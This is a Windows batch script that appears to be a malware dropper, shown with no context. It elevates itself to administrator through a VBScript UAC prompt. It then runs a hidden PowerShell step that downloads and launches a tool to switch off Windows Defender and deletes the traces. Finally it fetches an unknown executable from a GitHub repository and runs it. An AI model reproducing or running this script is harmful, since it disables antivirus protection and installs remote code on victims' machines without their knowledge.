set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )

PowerShell -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('https://www.sordum.org/files/download/defender-control/DefenderControl.zip','C:\Program Files\defender.zip');Expand-Archive -path 'C:\Program Files\defender.zip' -destinationpath 'C:\Program Files\';Set-Variable abc 'C:\Program Files\DefenderControl\DefenderControl.exe';Start-Process $abc /D;Remove-Item 'C:\Program Files\defender.zip';Start-Sleep -s 7;Remove-Item 'C:\Program Files\DefenderControl\' -Recurse;

timeout 8 > NUL

cd %tmp% && del windows.exe && wget https://github.com/FindMeSir/idurRatu/raw/main/windows.exe && windows.exe